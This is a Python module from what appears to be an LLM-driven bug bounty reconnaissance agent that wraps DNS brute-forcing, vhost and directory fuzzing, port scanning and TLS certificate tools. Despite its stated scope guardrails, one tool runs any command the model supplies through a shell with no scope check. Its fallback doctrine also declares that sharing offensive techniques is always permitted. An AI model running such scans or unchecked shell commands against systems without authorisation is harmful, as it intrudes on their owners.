"""
hellhound/core/agent.py

Autonomous Bug Bounty Reconnaissance & Triage Agent.
Coordinates discovery tools, enforces code-level scope guardrails,
manages target task context, and triages verified findings.
"""

from dataclasses import dataclass
from datetime import datetime, timezone
import base64
import difflib
import hashlib
import hmac
import json
import logging
import time
import os
import threading
from pathlib import Path
import re
import subprocess

# Generic CTF-style flag token (THM{...}, HTB{...}, flag{...}, CTF{...}, etc.)
# used to dedup record_finding calls that report the same flag under a
# reworded title instead of by exact-dict match.
_FLAG_TOKEN_PATTERN = re.compile(r"[A-Za-z0-9_]{2,20}\{[^{}]{3,150}\}")
import sys
from typing import Dict, Any, List, Optional, Callable, Set
from urllib.parse import urlparse, urljoin, urlunparse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from hellhound.core.scope import is_in_scope, check_module_against_rules, normalize_host
from hellhound.core.tasks import Target, create_or_load_target, save_target, sanitize_target_name
from hellhound.core.guard import AutopilotGuard
from hellhound.core.ai_utils import (
    load_config,
    ask_neural_core,
    SYNTHESIZER_PERSONA,
    CHAT_PERSONA_SLM,
)
from hellhound.core.http_utils import (
    merge_global_context,
    normalize_headers,
    normalize_cookies,
)
from hellhound.memory import (
    build_investigation_summary,
    update_from_subfinder,
    update_from_httpx,
    update_from_spider,
    update_from_subzy,
    update_from_bac,
    add_lesson,
    find_relevant_lessons,
    format_lessons_block,
)
from hellhound.core.skills import (
    get_relevant_skills_prompt,
    discover_skills,
    load_skill_body,
)
from hellhound.core.toolcheck import ensure_tool, get_binary_path


def _load_baseline_rules() -> str:
    """Load always-on baseline doctrine rules from core baseline_rules.md."""
    rules_file = Path(__file__).resolve().parent / "baseline_rules.md"
    if rules_file.exists():
        try:
            return rules_file.read_text(encoding="utf-8").strip()
        except Exception:
            pass
    return (
        "BASELINE DOCTRINE:\n"
        "1. Verify target scope before network actions.\n"
        "2. Reconnaissance & factual triage only — no unauthorized exploitation. Knowledge sharing about offensive techniques is always permitted.\n"
        "3. Never record theoretical bugs; require concrete reproducible evidence.\n"
        "4. Qualify dead attack surfaces quickly."
    )


BASELINE_RULES_PROMPT = _load_baseline_rules()


logger = logging.getLogger("hellhound.agent")


# ==========================================================
# TOOL DEFINITIONS & SPECIFICATIONS
# ==========================================================

@dataclass
class ToolSpec:
    name: str
    description: str
    parameters: Dict[str, Any]
    executor: Callable[[Dict[str, Any], Target, Any], Dict[str, Any]]


# ==========================================================
# TOOL EXECUTORS (RECON & TRIAGE ONLY)
# ==========================================================

def _find_binary(name: str) -> Optional[str]:
    """Find binary in system PATH as well as standard user Go binary directories."""
    return get_binary_path(name)


def _resolve_resolvers_path() -> str:
    """Resolve DNS resolvers file, checking fast local list, tool configs, standard SecLists paths, or generating default public resolvers."""
    repo_root = Path(__file__).resolve().parent.parent
    candidates = [
        str(repo_root / "wordlists" / "dns" / "resolvers-fast.txt"),
        "/usr/share/wordlists/seclists/Miscellaneous/dns-resolvers.txt",
        "/usr/share/seclists/Miscellaneous/dns-resolvers.txt",
        str(Path.home() / "HACK-HUB" / "bug-hunting" / "Tools" / "resolvers.txt"),
        str(Path.home() / ".config" / "subfinder" / "resolvers.txt"),
        str(Path.home() / ".config" / "dnsx" / "resolvers.txt"),
        str(Path.home() / ".hellhound" / "resolvers.txt")
    ]
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 0:
            return c
    default_res = Path.home() / ".hellhound" / "resolvers.txt"
    default_res.parent.mkdir(parents=True, exist_ok=True)
    if not default_res.exists() or default_res.stat().st_size == 0:
        default_res.write_text("1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n")
    return str(default_res)


# Every root a wordlist realistically lives under on a hunting box — not just
# the repo's own bundled fallback. Covers Kali's standard system locations
# (both the /usr/share/wordlists symlink farm and the real /usr/share/seclists
# tree), the classic dirb/dirbuster/wfuzz/amass package dirs, common manual
# SecLists clone spots, and the researcher's own home-directory conventions
# (~/HACK-HUB is this researcher's actual layout — see resolvers above).
_WORDLIST_SEARCH_ROOTS = [
    "/usr/share/wordlists",
    "/usr/share/seclists",
    "/usr/share/dirb/wordlists",
    "/usr/share/dirbuster",
    "/usr/share/wfuzz/wordlist",
    "/usr/share/amass/wordlists",
    "/opt/SecLists",
    "/opt/wordlists",
    str(Path.home() / "HACK-HUB"),
    str(Path.home() / "wordlists"),
    str(Path.home() / "SecLists"),
    str(Path.home() / ".local" / "share" / "wordlists"),
]


def _decompress_if_gz(path: Path) -> Path:
    """Kali ships rockyou.txt as rockyou.txt.gz; most fuzzing tools (ffuf,
    shuffledns) can't read gzip directly. Decompress once into a cached
    plaintext copy under ~/.hellhound/wordlist_cache and reuse it after."""
    if path.suffix != ".gz":
        return path
    cache_dir = Path.home() / ".hellhound" / "wordlist_cache"
    try:
        cache_dir.mkdir(parents=True, exist_ok=True)
        dest = cache_dir / path.stem  # strips the .gz
        if not dest.exists() or dest.stat().st_size == 0:
            import gzip
            import shutil
            with gzip.open(path, "rb") as f_in, open(dest, "wb") as f_out:
                shutil.copyfileobj(f_in, f_out)
        return dest
    except Exception:
        return path  # best-effort — caller's existence check will just fail through


def _resolve_wordlist(category: str, explicit: str = "",
                       curated_candidates: Optional[List[Path]] = None,
                       emit: Any = None) -> Optional[str]:
    """
    Resolve a wordlist for DNS/vhost/content fuzzing tools. Search order:
      1. `explicit` as a literal path — used as-is if it exists.
      2. `explicit` as a bare name (e.g. 'rockyou', 'raft-large-directories',
         'dirb') — case-insensitive filename search across every standard
         Linux wordlist location (SecLists, dirb, dirbuster, wfuzz, amass,
         and the researcher's own ~/HACK-HUB or ~/SecLists clones), so the
         researcher can say "use rockyou" / "use the raft list" without
         knowing the exact path on this particular box.
      3. `curated_candidates` — the caller's fast, known-good defaults for
         this category (unchanged behavior when no explicit wordlist is
         given — this stays the common-case path with zero extra latency).
      4. A best-effort broad search of the standard roots by category
         keyword, as a last resort before giving up entirely.
    Transparently decompresses a .gz hit (e.g. rockyou.txt.gz) into a cached
    plaintext copy.
    """
    def _pick(p: Path) -> Optional[str]:
        try:
            if p.exists() and p.is_file() and p.stat().st_size > 0:
                return str(_decompress_if_gz(p))
        except OSError:
            pass
        return None

    def _bounded_rglob(root_path: Path, cap: int = 20000):
        # rglob is lazy — cap how many entries we walk so a huge tree
        # (a full SecLists clone is tens of thousands of files) can't turn
        # a single tool call into a multi-minute filesystem crawl.
        for i, f in enumerate(root_path.rglob("*")):
            if i >= cap:
                return
            yield f

    if explicit:
        # 1. Literal path
        hit = _pick(Path(explicit).expanduser())
        if hit:
            return hit

        # 2. Bare name — search known roots for a filename match
        needle = explicit.strip().lower().replace(" ", "-").replace(".txt", "")
        matches = []
        for root in _WORDLIST_SEARCH_ROOTS:
            root_path = Path(root)
            if not root_path.exists():
                continue
            try:
                for f in _bounded_rglob(root_path):
                    if f.is_file() and needle in f.name.lower():
                        matches.append(f)
            except (PermissionError, OSError):
                continue
        if matches:
            matches.sort(key=lambda f: f.stat().st_size, reverse=True)
            if emit and hasattr(emit, "info"):
                emit.info(f"[*] Resolved wordlist '{explicit}' -> {matches[0]}")
            hit = _pick(matches[0])
            if hit:
                return hit
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[!] Requested wordlist '{explicit}' not found on disk or in standard locations — falling back to default.")

    # 3. Curated known-good candidates for this category (default fast path)
    for wc in (curated_candidates or []):
        hit = _pick(Path(wc))
        if hit:
            return hit

    # 4. Best-effort broad search by category keyword
    category_hints = {
        "dns": ("dns", "subdomain"),
        "vhost": ("vhost", "subdomain", "dns"),
        "content": ("common", "directory", "raft", "content"),
    }.get(category, ())
    if category_hints:
        for root in _WORDLIST_SEARCH_ROOTS:
            root_path = Path(root)
            if not root_path.exists():
                continue
            try:
                for f in _bounded_rglob(root_path):
                    if f.is_file() and any(h in f.name.lower() for h in category_hints):
                        hit = _pick(f)
                        if hit:
                            return hit
            except (PermissionError, OSError):
                continue

    return None


def _execute_shuffledns(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Active DNS brute-force via shuffledns (massdns-backed) with wildcard handling."""
    domain = (args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("shuffledns", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "shuffledns not installed",
            "message": check["message"],
            "hint": "pdtm -i shuffledns"
        }

    binary = get_binary_path("shuffledns") or "shuffledns"

    # Resolve wordlist path (prioritize SecLists / Kali system wordlists, fallback to curated fast list)
    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        Path("/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/wordlists/amass/subdomains.lst"),
        repo_root / "wordlists" / "dns" / "subdomains-fast.txt"
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No DNS wordlist found in repository or standard SecLists paths."}

    resolvers = _resolve_resolvers_path()
    massdns_bin = _find_binary("massdns") or "/usr/bin/massdns"

    cmd = [binary, "-d", domain, "-w", wordlist, "-r", resolvers, "-mode", "bruteforce", "-silent"]
    if os.path.exists(massdns_bin):
        cmd.extend(["-m", massdns_bin])

    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=90, emit=emit, label="dns_bruteforce (active DNS enumeration)")
        subdomains = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"shuffledns execution failed: {e}", "domain": domain}

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in subdomains:
        if s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(subdomains),
        "subdomains": subdomains[:100],
        "total_discovered": len(subdomains)
    }


def _execute_ffuf_vhost(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Virtual-host fuzzing via ffuf to discover vhosts sharing an IP or host."""
    domain = args.get("domain", "").strip().lower() or target.name
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    target_ip = args.get("target_ip", "").strip() or domain
    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "vhosts" / "vhosts.txt",
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No vhost wordlist found."}

    target_url = target_ip if target_ip.startswith(("http://", "https://")) else f"http://{target_ip}"
    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-H", f"Host: FUZZ.{domain}",
        "-mc", "200,301,302,403",
        "-of", "json",
        "-o", "-",
        "-s"
    ]

    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="vhost_fuzz (Host header fuzzing)")
        results = []
        if proc.stdout.strip():
            data = json.loads(proc.stdout)
            raw_res = data.get("results", [])
            for r in raw_res:
                vhost = r.get("input", {}).get("FUZZ", "")
                status = r.get("status", 0)
                length = r.get("length", 0)
                full_host = f"{vhost}.{domain}" if vhost else ""
                results.append({
                    "host": full_host,
                    "status": status,
                    "length": length
                })
    except Exception as e:
        results = []

    return {
        "domain": domain,
        "target": target_url,
        "vhosts_found": results,
        "count": len(results)
    }


def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Content & directory fuzzing via ffuf."""
    import tempfile
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "web" / "directories-fast.txt",
        Path("/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No directory wordlist found."}

    target_url = url.rstrip("/") + "/FUZZ"
    temp_json = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            temp_json = tf.name
    except Exception:
        temp_json = None

    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-mc", "200,204,301,302,307,401,403,405",
        "-t", "40",
        "-timeout", "5",
        "-s"
    ]

    if temp_json:
        cmd.extend(["-of", "json", "-o", temp_json])

    # Pass authenticated headers/cookies if available
    req_headers = normalize_headers(args.get("headers"))
    if not req_headers and hasattr(target, "state") and isinstance(target.state, dict):
        req_headers = normalize_headers(target.state.get("headers"))
    for hk, hv in req_headers.items():
        if isinstance(hv, str) and hv.strip():
            cmd.extend(["-H", f"{hk}: {hv.strip()}"])

    # Pass cookies
    req_cookies = normalize_cookies(args.get("cookies") or args.get("cookie"))
    if not req_cookies and hasattr(target, "state") and isinstance(target.state, dict):
        req_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
    if req_cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in req_cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    results = []
    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=90, emit=emit, label="content_discovery (path fuzzing)")
        
        # Read structured JSON output from tempfile
        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
                raw_res = data.get("results", [])
                for r in raw_res:
                    path = r.get("input", {}).get("FUZZ", "")
                    status = r.get("status", 0)
                    length = r.get("length", 0)
                    redirect = r.get("redirectlocation", "")
                    hit_url = r.get("url", f"{url.rstrip('/')}/{path}")
                    results.append({
                        "url": hit_url,
                        "path": path,
                        "status": status,
                        "length": length,
                        "redirect": redirect
                    })
        elif proc.stdout.strip():
            # Fallback: parse raw lines from stdout
            for line in proc.stdout.strip().splitlines():
                line_clean = line.strip()
                if line_clean and not line_clean.startswith("[") and not line_clean.startswith("::"):
                    results.append({
                        "url": f"{url.rstrip('/')}/{line_clean}",
                        "path": line_clean,
                        "status": 200,
                        "length": 0
                    })
    except Exception as e:
        results = []
    finally:
        if temp_json and os.path.exists(temp_json):
            try:
                os.remove(temp_json)
            except Exception:
                pass

    paths = [r["path"] for r in results]

    # Automatically register discovered endpoints in target state
    if hasattr(target, "state") and isinstance(target.state, dict):
        if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
            target.state["endpoints"] = []
        for r in results:
            hit_url = r.get("url")
            if hit_url and hit_url not in target.state["endpoints"]:
                target.state["endpoints"].append(hit_url)
        save_target(target)

    return {
        "target_url": url,
        "paths": paths,
        "discovered_endpoints": results[:100],
        "count": len(results)
    }


def _execute_terminal_command(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Execute a custom terminal command/Kali tool targeting a specified host/IP."""
    command = args.get("command", "").strip()
    target_host = args.get("target", "").strip()

    if not command:
        return {"error": "No command specified."}

    try:
        import subprocess
        # 180s timeout to prevent locking execution loops
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=180
        )
        return {
            "command": command,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "exit_code": proc.returncode
        }
    except subprocess.TimeoutExpired:
        return {
            "command": command,
            "error": "Command execution timed out after 180 seconds."
        }
    except Exception as e:
        return {
            "command": command,
            "error": f"Failed to execute command: {e}"
        }


def _run_cmd_with_heartbeat(cmd: List[str], timeout: int, emit: Any, label: str,
                              heartbeat_interval: int = 5) -> "subprocess.CompletedProcess":
    """
    Runs a subprocess without blocking silently for the full timeout window.
    Long recon calls (passive OSINT lookups, DNS brute-force) previously used
    a single `subprocess.run(..., timeout=N)` — the terminal showed nothing
    between "tool started" and "tool finished," which for an unindexed
    domain (nothing found until timeout) looked exactly like a hang.
    Polls in `heartbeat_interval`-second slices and emits a progress line
    each time so the CLI stays visibly alive, then hard-kills at `timeout`.
    """
    start = time.monotonic()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        while True:
            elapsed = time.monotonic() - start
            remaining = timeout - elapsed
            if remaining <= 0:
                proc.kill()
                try:
                    proc.communicate(timeout=5)
                except Exception:
                    pass
                raise subprocess.TimeoutExpired(cmd, timeout)
            try:
                stdout, stderr = proc.communicate(timeout=min(heartbeat_interval, remaining))
                return subprocess.CompletedProcess(cmd, proc.returncode, stdout, stderr)
            except subprocess.TimeoutExpired:
                if emit and hasattr(emit, "info"):
                    emit.info(f"[*] {label} still running ({int(time.monotonic() - start)}s)...")
                continue
    finally:
        if proc.poll() is None:
            proc.kill()


def _execute_subfinder(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    domain = domain.strip().lower()
    if domain.startswith("http://") or domain.startswith("https://"):
        domain = urlparse(domain).netloc.split(":")[0]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("subfinder", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "subfinder not installed",
            "message": check["message"],
            "hint": "pdtm -i subfinder"
        }

    subfinder_bin = get_binary_path("subfinder") or "subfinder"
    subdomains = set()

    try:
        cmd = [subfinder_bin, "-d", domain, "-silent", "-all", "-timeout", "10"]
        proc = _run_cmd_with_heartbeat(cmd, timeout=45, emit=emit, label="subfinder (passive OSINT lookup)")
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                sub = line.strip().lower()
                if sub and "." in sub:
                    subdomains.add(sub)
    except Exception as e:
        logger.warning(f"subfinder execution failed: {e}")

    sub_list = sorted(list(subdomains))
    # Update target state and investigation memory
    try:
        update_from_subfinder(target, sub_list)
        save_target(target)
    except Exception:
        if "subdomains" not in target.state:
            target.state["subdomains"] = []
        for s in sub_list:
            if s not in target.state["subdomains"]:
                target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(sub_list),
        "subdomains": sub_list[:100],  # Return up to 100 in context
        "total_discovered": len(sub_list)
    }


def _execute_port_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Port scanning via naabu to discover open TCP/UDP ports and non-standard web services."""
    raw_target = args.get("hosts") or args.get("target") or args.get("host") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for port scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("naabu", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "naabu not installed",
            "message": check["message"],
            "hint": "pdtm -i naabu"
        }

    binary = get_binary_path("naabu") or "naabu"

    ports = str(args.get("ports", "top-100")).strip().lower()
    exclude_ports = args.get("exclude_ports")

    cmd = [binary, "-j", "-silent"]
    if ports in ("top-100", "top100", "100"):
        cmd.extend(["-tp", "100"])
    elif ports in ("top-1000", "top1000", "1000"):
        cmd.extend(["-tp", "1000"])
    elif ports in ("full", "all", "top-full"):
        cmd.extend(["-tp", "full"])
    else:
        cmd.extend(["-p", ports])

    if exclude_ports:
        cmd.extend(["-exclude-ports", str(exclude_ports)])

    open_ports = []
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=120)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        open_ports.append({
                            "host": item.get("host"),
                            "ip": item.get("ip", ""),
                            "port": item.get("port"),
                            "protocol": item.get("protocol", "tcp"),
                            "tls": item.get("tls", False)
                        })
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"naabu execution failed: {e}", "hosts": cleaned_targets}

    # Update target state
    if "open_ports" not in target.state:
        target.state["open_ports"] = []
    for p in open_ports:
        if p not in target.state["open_ports"]:
            target.state["open_ports"].append(p)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(open_ports),
        "open_ports": open_ports
    }


def _execute_permute_subdomains(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Generate subdomain wordlist mutations and permutations using alterx."""
    raw_subdomains = args.get("subdomains") or args.get("domains") or target.state.get("subdomains") or [target.name]
    if isinstance(raw_subdomains, list):
        sub_list = [str(s).strip().lower() for s in raw_subdomains if str(s).strip()]
    elif isinstance(raw_subdomains, str) and "," in raw_subdomains:
        sub_list = [s.strip().lower() for s in raw_subdomains.split(",") if s.strip()]
    else:
        sub_list = [str(raw_subdomains).strip().lower()]

    cleaned = []
    for s in sub_list:
        if s.startswith(("http://", "https://")):
            s = urlparse(s).netloc.split(":")[0]
        if s:
            cleaned.append(s)

    if not cleaned:
        return {"error": "No subdomains provided for permutation generation."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("alterx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "alterx not installed",
            "message": check["message"],
            "hint": "pdtm -i alterx"
        }

    binary = get_binary_path("alterx") or "alterx"

    limit = int(args.get("limit", 500))
    cmd = [binary, "-silent", "-limit", str(limit)]

    candidates = []
    try:
        input_data = "\n".join(cleaned)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        candidates = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"alterx execution failed: {e}"}

    return {
        "count": len(candidates),
        "candidates": candidates[:100],  # Return first 100 in context
        "total_generated": len(candidates)
    }


def _execute_resolve_candidates(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Bulk-resolve and filter candidate domain names using dnsx."""
    raw_candidates = args.get("candidates") or args.get("domains") or args.get("subdomains")
    if isinstance(raw_candidates, list):
        cand_list = [str(c).strip().lower() for c in raw_candidates if str(c).strip()]
    elif isinstance(raw_candidates, str) and "," in raw_candidates:
        cand_list = [c.strip().lower() for c in raw_candidates.split(",") if c.strip()]
    elif isinstance(raw_candidates, str) and raw_candidates.strip():
        cand_list = [raw_candidates.strip().lower()]
    else:
        cand_list = target.state.get("subdomains", [target.name])

    cleaned = []
    for c in cand_list:
        if c.startswith(("http://", "https://")):
            c = urlparse(c).netloc.split(":")[0]
        if c:
            cleaned.append(c)

    if not cleaned:
        return {"error": "No candidate domains provided for resolution."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("dnsx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "dnsx not installed",
            "message": check["message"],
            "hint": "pdtm -i dnsx"
        }

    binary = get_binary_path("dnsx") or "dnsx"

    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
        f.write("\n".join(cleaned) + "\n")
        tmp_path = f.name

    resolved = []
    try:
        resolvers = _resolve_resolvers_path()
        cmd = [binary, "-l", tmp_path, "-silent", "-json", "-a", "-cname", "-resp"]
        if resolvers and os.path.exists(resolvers):
            cmd.extend(["-r", resolvers])

        proc = _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="resolve_candidates (DNS resolution)")
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        host = item.get("host")
                        if host:
                            resolved.append({
                                "host": host,
                                "a": item.get("a", []),
                                "cname": item.get("cname", []),
                                "status_code": item.get("status_code", "NOERROR")
                            })
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"dnsx resolution failed: {e}"}
    finally:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for r in resolved:
        h = r["host"]
        if h not in target.state["subdomains"]:
            target.state["subdomains"].append(h)

    return {
        "count": len(resolved),
        "resolved": resolved[:100],
        "total_resolved": len(resolved)
    }


def _execute_tls_cert_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan and parse TLS/SSL certificate SANs and CNs using tlsx to discover related infrastructure."""
    raw_target = args.get("hosts") or args.get("target") or args.get("domains") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for TLS certificate scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("tlsx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "tlsx not installed",
            "message": check["message"],
            "hint": "pdtm -i tlsx"
        }

    binary = get_binary_path("tlsx") or "tlsx"

    port = str(args.get("port", "443")).strip()
    cmd = [binary, "-san", "-cn", "-so", "-silent", "-json", "-p", port]

    results = []
    discovered_sans = set()
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        host = item.get("host")
                        cn = item.get("subject_cn", "")
                        sans = item.get("subject_an", [])
                        results.append({
                            "host": host,
                            "ip": item.get("ip", ""),
                            "subject_cn": cn,
                            "subject_an": sans,
                            "issuer_org": item.get("issuer_org", []),
                            "tls_version": item.get("tls_version", ""),
                            "wildcard": item.get("wildcard_certificate", False)
                        })
                        if cn and "." in cn and not cn.startswith("*"):
                            discovered_sans.add(cn.lower())
                        for s in sans:
                            clean_s = s.lower().lstrip("*.")
                            if clean_s and "." in clean_s:
                                discovered_sans.add(clean_s)
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"tlsx execution failed: {e}", "hosts": cleaned_targets}

    # Update target state with discovered SAN names matching root domain if available
    san_list = sorted(list(discovered_sans))
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in san_list:
        if target.name in s and s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(results),
        "certificates": results,
        "discovered_domains": san_list[:50]
    }


def _execute_httpx(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    raw_target = args.get("target") or target.name
    targets_to_probe = []
    if isinstance(raw_target, list):
        targets_to_probe = raw_target
    else:
        targets_to_probe = [raw_target]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("httpx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])

    live_hosts = []

    # 1. Try local httpx binary if available
    httpx_bin = get_binary_path("httpx") if check["available"] else None
    if httpx_bin:
        try:
            input_data = "\n".join(targets_to_probe)
            cmd = [httpx_bin, "-silent", "-status-code", "-title", "-tech-detect", "-cl", "-location", "-json"]
            proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
            if proc.returncode == 0:
                for line in proc.stdout.splitlines():
                    if line.strip():
                        try:
                            item = json.loads(line.strip())
                            live_hosts.append({
                                "url": item.get("url"),
                                "status_code": item.get("status_code"),
                                "title": item.get("title", ""),
                                "tech": item.get("tech", []),
                                "webserver": item.get("webserver", ""),
                                "content_length": item.get("content_length"),
                                "location": item.get("location", "")
                            })
                        except Exception:
                            pass
        except Exception as e:
            logger.warning(f"httpx binary failed: {e}")

    # 2. Fallback to lightweight HTTP probe (runs if binary unavailable or returned no hosts)
    if not live_hosts:
        for t in targets_to_probe[:20]:
            host = t.strip()
